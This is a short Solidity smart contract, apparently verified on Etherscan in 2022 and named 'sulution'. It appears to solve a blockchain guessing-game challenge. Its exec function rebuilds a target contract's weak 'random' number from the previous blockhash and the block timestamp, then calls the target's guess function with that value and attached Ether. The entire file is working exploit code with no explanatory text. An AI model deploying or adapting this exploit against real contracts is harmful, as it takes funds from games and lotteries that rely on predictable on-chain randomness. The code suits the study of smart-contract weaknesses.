/**
 *Submitted for verification at Etherscan.io on 2022-02-15
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.11;


contract sulution {
    receive() external payable {
   
    }
    function exec(address _addr) public payable {

        (bool success, ) = _addr.call{value: msg.value}(
            abi.encodeWithSignature("guess(uint8)", uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))))
        );
        require(success, "Failed to send guess");

    }

}